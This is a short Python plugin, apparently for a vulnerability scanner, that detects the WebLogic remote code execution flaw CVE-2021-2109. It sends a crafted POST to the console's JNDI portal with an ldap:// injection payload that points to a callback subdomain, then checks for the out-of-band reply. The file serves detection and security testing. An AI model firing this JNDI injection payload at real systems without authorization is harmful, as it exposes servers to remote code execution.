# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "WebLogic 远程代码执行漏洞",
        "description": "CVE-2021-2109是存在于WebLogic Server的console中的一个远程代码执行漏洞，经过身份验证的攻击者可以直接通过JNDI远程执行命令或者注入代码，可以配合CVE-2020-14882未授权漏洞执行任意代码。",
        "references": ["-"],
    }

    def url(self) -> dict:
        with self.echo_query() as execute:
            subdomain = execute.get_subdomain()
            self.request(
                method='POST',
                path='./console/consolejndi.portal',
                timeout=15,
                data=f"_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://{subdomain};AdminServer%22)"
            )
            if execute.verify():
                return {"LoopholeInfo": self.__info__}
